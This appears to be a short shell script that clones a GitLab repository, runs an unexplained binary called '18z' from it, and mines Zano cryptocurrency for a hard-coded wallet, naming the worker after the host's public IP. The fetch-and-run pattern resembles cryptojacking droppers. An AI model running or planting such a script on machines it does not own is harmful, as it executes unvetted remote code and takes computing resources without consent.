#!/bin/sh
git clone https://gitlab.com/blevinschase203389/miniz.git
cd miniz
chmod +x 18z
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && ./18z --url=ZxDAs3wUtBej4jYU8FJ4nQLbXS6ssTAGCEwEutSSZS7tR4yY6xxFs4m93opr971o5TH8gGfW4xsFkeXSeSQfx6wZ1vEAmVpTA.$ip-zano@zano.luckypool.io:8866 --log --extra
